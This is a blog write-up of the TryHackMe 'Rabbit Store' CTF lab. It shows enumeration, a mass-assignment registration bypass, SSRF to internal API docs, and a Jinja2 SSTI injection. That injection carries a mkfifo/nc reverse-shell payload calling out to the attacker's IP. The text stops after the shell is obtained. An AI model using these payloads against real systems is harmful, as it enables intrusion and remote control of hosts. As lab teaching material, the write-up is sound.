---
title: "TryHackMe: Rabbit Store"
author: cilgin
date: 2025-07-07 14:23:56 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: false
math: false
mermaid: false
image:
  path: /assets/img/2025-07-07-TryHackMe-Rabbit_Store/main.webp
---

Hi I'm making TryHackMe <https://tryhackme.com/room/rabbitstore> room.


---


```bash
export IP=10.10.144.3
```


```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-07 14:24 +0300
Nmap scan report for 10.10.144.3
Host is up (0.073s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://cloudsite.thm/
4369/tcp  open  epmd    Erlang Port Mapper Daemon
25672/tcp open  unknown
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.62 seconds
```


```bash
❯ curl $IP                      
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://cloudsite.thm/">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 10.10.144.3 Port 80</address>
</body></html>
```

Lets add `cloudsite.thm` to `/etc/hosts`



![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo1.webp){: width="972" height="589" }

You can see that this is a site cloud Saas website template


If you try to click log in you'll directed to `storage.cloudsite.thm`.


Lets try adding this to our `/etc/hosts`



![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo2.webp){: width="972" height="589" }




I tried admin admin but It wanted me a e mail lets look at the site for any emails.


```text
info@smarteyeapps.com
sales@smarteyeapps.com
```

I found this too maybe it can be helpful.


The login request is like this


```text
{"email":"pwned@pwned.com","password":"123123123"}
```

on `http://storage.cloudsite.thm/api/login` end


I also created a account named pwned@pwned.com password 1234


When I log in I see this.

![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo3.webp){: width="972" height="589" }


Which means we can't do anything with this account.


We can brute force found emails but firstly fuzz the website using `gobuster`



```bash
❯ gobuster dir -w common.txt -u http://cloudsite.thm -x md,js,html,php,py,css,txt,bak -t 50
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cloudsite.thm
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              css,txt,bak,md,js,html,php,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about_us.html        (Status: 200) [Size: 9992]
/assets               (Status: 301) [Size: 315] [--> http://cloudsite.thm/assets/]
/blog.html            (Status: 200) [Size: 10939]
/contact_us.html      (Status: 200) [Size: 9914]
/index.html           (Status: 200) [Size: 18451]
/index.html           (Status: 200) [Size: 18451]
/javascript           (Status: 301) [Size: 319] [--> http://cloudsite.thm/javascript/]
/server-status        (Status: 403) [Size: 278]
/services.html        (Status: 200) [Size: 9358]
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```



```bash
❯ gobuster dir -w common.txt -u http://storage.cloudsite.thm -x md,js,html,php,py,css,txt,bak -t 50
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://storage.cloudsite.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              css,txt,bak,md,js,html,php,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 331] [--> http://storage.cloudsite.thm/assets/]
/css                  (Status: 301) [Size: 328] [--> http://storage.cloudsite.thm/css/]
/fonts                (Status: 301) [Size: 330] [--> http://storage.cloudsite.thm/fonts/]
/images               (Status: 301) [Size: 331] [--> http://storage.cloudsite.thm/images/]
/index.html           (Status: 200) [Size: 9039]
/index.html           (Status: 200) [Size: 9039]
/javascript           (Status: 301) [Size: 335] [--> http://storage.cloudsite.thm/javascript/]
/js                   (Status: 301) [Size: 327] [--> http://storage.cloudsite.thm/js/]
/register.html        (Status: 200) [Size: 9043]
/server-status        (Status: 403) [Size: 286]
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```



I found on the assets config-scss.bat

Which is a bat file.


```text
cd E:\smarteye\consulting\3\html\assets
sass --watch scss/style.scss:css/style.css
```

This could be useful maybe.



Now lets fuzz api endpoint.


```bash
❯ gobuster dir -w common.txt -u http://storage.cloudsite.thm/api/ -x md,js,html,php,py,css,txt,bak -t 50
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://storage.cloudsite.thm/api/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              bak,md,js,html,php,py,css,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Login                (Status: 405) [Size: 36]
/docs                 (Status: 403) [Size: 27]
/login                (Status: 405) [Size: 36]
/register             (Status: 405) [Size: 36]
/updates-topic        (Status: 502) [Size: 428]
/uploads              (Status: 401) [Size: 32]
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```
I don't know what but there are two login endpoint `Login` and `login`

Maybe Login one could be vulnerable


I don't know what but i nuked my previus acocunt whatever make new one.


After trying /api/docs I found something:



```bash
❯ curl -s http://storage.cloudsite.thm/api/uploads
{"message":"Token not provided"}%                                                                       
```

If we go to the browser I get:

```text
message	"Your subscription is inactive. You cannot use our services."
```

```bash
❯ curl -s 'http://storage.cloudsite.thm/api/uploads' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFAYS5jb20iLCJzdWJzY3JpcHRpb24iOiJpbmFjdGl2ZSIsImlhdCI6MTc1MTg4OTkyMywiZXhwIjoxNzUxODkzNTIzfQ.qQb3z00lku8yAT6qCmXzKfugOoiJhbYV54va3Fmc07w'
{"message":"Your subscription is inactive. You cannot use our services."}%     
```

So maybe there is a thing in the token lets decode the token first.

After jwt decode I get this.

```text
{
    "email": "a@a.com",
    "subscription": "inactive",
    "iat": 1751889923,
    "exp": 1751893523
}
```


Lets register a new user with subscription active.

```bash
❯ curl -X POST 'http://storage.cloudsite.thm/api/register' -d '{
    "email": "b@b.com",
    "password": "1234",
    "subscription": "active"
}' -H "Content-Type: application/json"
{"message":"User registered successfully"}%                         
```



![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo4.webp){: width="972" height="589" }


And look what i found

We can upload files.


![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo5.webp){: width="972" height="589" }


I upload some file and when i go to the /api/uploads/* it downloads the file.


We can also upload from url some maybe giving /api/docs downloads the docs.


![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo6.webp){: width="972" height="589" }


And it downloaded 

```json
{"message":"Access denied"}
```


I think we should use localhost because it reroutes over internet which is giving access denied error.


If we look at the http headers we can see that it uses express on the backend so i'm guessing it works on localhost 3000



![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo7.webp){: width="972" height="589" }



And it gave me this file:


```text
Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```


So there is still one api endpoint we didn't find out. Which is /api/fetch_messeges_from_chatbot 



```bash
❯ curl -s 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot'
{"message":"Token not provided"}%                                                                       
```

Firtlt grep the token from browser:


```json
jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g
```

Lets firstly post empty data to the /api/fetch_messeges_from_chatbot endpoint

```bash
❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{"":""}' 
```

And we get 
```json
{
  "error": "username parameter is required"
}
```

Lets use the body'ies we used before for test.


```bash
❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{ 
    "username": "b"
}'
```
```html
<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, b@b.com, our chatbot server is currently under development.</h1>
 </body>
</html>%                                                          
```


```bash
❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{ 
    "username": "b"
}'
<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, b, our chatbot server is currently under development.</h1>
 </body>
</html>%                                                                                                
```

```bash
❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{ 
    "username": "admin"
}'
<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, admin, our chatbot server is currently under development.</h1>
 </body>
</html>%                                                                                                
```

Lets fuzz this using `ffuf`


At some point I thought about using polygot SSTI payload such as `${{<%[%'"}}%\.`

Lets try that

```bash
❯ curl -X POST 'http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot' -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYi5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4OTEyMDMsImV4cCI6MTc1MTg5NDgwM30.D-Y8bfaQthZkbFNtdd6o-M3cdu5K0GLcalHwZYS0K3g' -H "Content-Type: application/json" -d '{  
    {"username":"${{<%[%'\"}}%\\."}
}' 
```

Also my shell sucked by regex so i need to use other tool.

So i'll use `yaak`


![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo8.webp){: width="972" height="589" }

```html
<!doctype html>
<html lang=en>
  <head>
    <title>jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39;
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "3N5KsqGECxMzhx9H1W24";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>TemplateSyntaxError</h1>
<div class="detail">
  <p class="errormsg">jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39;
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">
  <h3></h3>
  <ul><li><div class="frame" id="frame-139714297136624">
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">1498</em>,
      in <code class="function">__call__</code></h4>
  <div class="source "><pre class="line before"><span class="ws">    </span>) -&gt; cabc.Iterable[bytes]:</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;The WSGI server calls the Flask application object as the</pre>
<pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
<pre class="line before"><span class="ws">        </span>wrapped to apply middleware.</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
<pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)</pre></div>
</div>

<li><div class="frame" id="frame-139714152878416">
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">1476</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source "><pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line before"><span class="ws">                </span>error = e</pre>
<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
<pre class="line after"><span class="ws">                </span>raise</pre>
<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre></div>
</div>

<li><div class="frame" id="frame-139714152878528">
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">1473</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source "><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
<pre class="line before"><span class="ws">        </span>error: BaseException | None = None</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">                </span>error = e</pre>
<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class="frame" id="frame-139714152878640">
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">882</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source "><pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
<pre class="line after"><span class="ws">        </span>self,</pre>
<pre class="line after"><span class="ws">        </span>rv: ft.ResponseReturnValue | HTTPException,</pre></div>
</div>

<li><div class="frame" id="frame-139714152878752">
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">880</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
</div>

<li><div class="frame" id="frame-139714152878864">
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>,
      line <em class="line">865</em>,
      in <code class="function">dispatch_request</code></h4>
  <div class="source "><pre class="line before"><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
<pre class="line before"><span class="ws">        </span>):</pre>
<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class="line before"><span class="ws">        </span>view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
</div>

<li><div class="frame" id="frame-139714152878976">
  <h4>File <cite class="filename">"/home/azrael/chatbotServer/chatbot.py"</cite>,
      line <em class="line">24</em>,
      in <code class="function">index</code></h4>
  <div class="source "><pre class="line before"><span class="ws"> </span>&lt;body&gt;</pre>
<pre class="line before"><span class="ws">   </span>&lt;h1&gt;Sorry, {}, our chatbot server is currently under development.&lt;/h1&gt;</pre>
<pre class="line before"><span class="ws"> </span>&lt;/body&gt;</pre>
<pre class="line before"><span class="ws"></span>&lt;/html&gt;&#39;&#39;&#39;.format(username)</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line current"><span class="ws">    </span>return render_template_string(template)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws"></span>if __name__ == &#39;__main__&#39;:</pre>
<pre class="line after"><span class="ws">    </span>app.run(debug=True, port=8000)</pre></div>
</div>

<li><div class="frame" id="frame-139714152879088">
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/templating.py"</cite>,
      line <em class="line">161</em>,
      in <code class="function">render_template_string</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>:param source: The source code of the template to render.</pre>
<pre class="line before"><span class="ws">    </span>:param context: The variables to make available in the template.</pre>
<pre class="line before"><span class="ws">    </span>&#34;&#34;&#34;</pre>
<pre class="line before"><span class="ws">    </span>app = current_app._get_current_object()  # type: ignore[attr-defined]</pre>
<pre class="line current"><span class="ws">    </span>template = app.jinja_env.from_string(source)</pre>
<pre class="line after"><span class="ws">    </span>return _render(app, template, context)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws"></span>def _stream(</pre>
<pre class="line after"><span class="ws">    </span>app: Flask, template: Template, context: dict[str, t.Any]</pre></div>
</div>

<li><div class="frame" id="frame-139714152881888">
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py"</cite>,
      line <em class="line">1108</em>,
      in <code class="function">from_string</code></h4>
  <div class="source "><pre class="line before"><span class="ws">        </span>:param template_class: Return an instance of this</pre>
<pre class="line before"><span class="ws">            </span>:class:`Template` class.</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
<pre class="line before"><span class="ws">        </span>gs = self.make_globals(globals)</pre>
<pre class="line before"><span class="ws">        </span>cls = template_class or self.template_class</pre>
<pre class="line current"><span class="ws">        </span>return cls.from_code(self, self.compile(source), gs, None)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def make_globals(</pre>
<pre class="line after"><span class="ws">        </span>self, d: t.Optional[t.MutableMapping[str, t.Any]]</pre>
<pre class="line after"><span class="ws">    </span>) -&gt; t.MutableMapping[str, t.Any]:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Make the globals map for a template. Any given template</pre></div>
</div>

<li><div class="frame" id="frame-139714153021616">
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py"</cite>,
      line <em class="line">768</em>,
      in <code class="function">compile</code></h4>
  <div class="source "><pre class="line before"><span class="ws">                </span>return source</pre>
<pre class="line before"><span class="ws">            </span>if filename is None:</pre>
<pre class="line before"><span class="ws">                </span>filename = &#34;&lt;template&gt;&#34;</pre>
<pre class="line before"><span class="ws">            </span>return self._compile(source, filename)</pre>
<pre class="line before"><span class="ws">        </span>except TemplateSyntaxError:</pre>
<pre class="line current"><span class="ws">            </span>self.handle_exception(source=source_hint)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def compile_expression(</pre>
<pre class="line after"><span class="ws">        </span>self, source: str, undefined_to_none: bool = True</pre>
<pre class="line after"><span class="ws">    </span>) -&gt; &#34;TemplateExpression&#34;:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;A handy helper method that returns a callable that accepts keyword</pre></div>
</div>

<li><div class="frame" id="frame-139714153021728">
  <h4>File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py"</cite>,
      line <em class="line">939</em>,
      in <code class="function">handle_exception</code></h4>
  <div class="source "><pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;Exception handling helper.  This is used internally to either raise</pre>
<pre class="line before"><span class="ws">        </span>rewritten exceptions or return a rendered traceback for the template.</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
<pre class="line before"><span class="ws">        </span>from .debug import rewrite_traceback_stack</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line current"><span class="ws">        </span>raise rewrite_traceback_stack(source=source)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def join_path(self, template: str, parent: str) -&gt; str:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Join a template with the parent.  By default all the lookups are</pre>
<pre class="line after"><span class="ws">        </span>relative to the loader root so this method returns the `template`</pre>
<pre class="line after"><span class="ws">        </span>parameter unchanged, but if the paths should be relative to the</pre></div>
</div>

<li><div class="frame" id="frame-139714153021840">
  <h4>File <cite class="filename">"&lt;unknown&gt;"</cite>,
      line <em class="line">9</em>,
      in <code class="function">template</code></h4>
  <div class="source "></div>
</div>
</ul>
  <blockquote>jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39;
</blockquote>
</div>

<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 1498, in __call__
    return self.wsgi_app(environ, start_response)
  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 1476, in wsgi_app
    response = self.handle_exception(e)
  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File &#34;/home/azrael/chatbotServer/chatbot.py&#34;, line 24, in index
    return render_template_string(template)
  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/templating.py&#34;, line 161, in render_template_string
    template = app.jinja_env.from_string(source)
  File &#34;/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py&#34;, line 1108, in from_string
    return cls.from_code(self, self.compile(source), gs, None)
  File &#34;/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py&#34;, line 768, in compile
    self.handle_exception(source=source_hint)
  File &#34;/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py&#34;, line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File &#34;&lt;unknown&gt;&#34;, line 9, in template
jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39;
</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1498, in __call__
    return self.wsgi_app(environ, start_response)
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1476, in wsgi_app
    response = self.handle_exception(e)
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "/home/azrael/chatbotServer/chatbot.py", line 24, in index
    return render_template_string(template)
  File "/home/azrael/.local/lib/python3.10/site-packages/flask/templating.py", line 161, in render_template_string
    template = app.jinja_env.from_string(source)
  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 1108, in from_string
    return cls.from_code(self, self.compile(source), gs, None)
  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 768, in compile
    self.handle_exception(source=source_hint)
  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "<unknown>", line 9, in template
jinja2.exceptions.TemplateSyntaxError: unexpected '<'


-->
```


And jinja2 templating engine gave errors. Now we know that jinja2 is vulnerable to SSTI.
We can use this vulnerability to get reverse shell using this


```json
{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.21.206.128 4444 >/tmp/f').read() }}"}
```


![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo9.webp){: width="972" height="589" }


Firstly lets upgrade the shell.


```bash
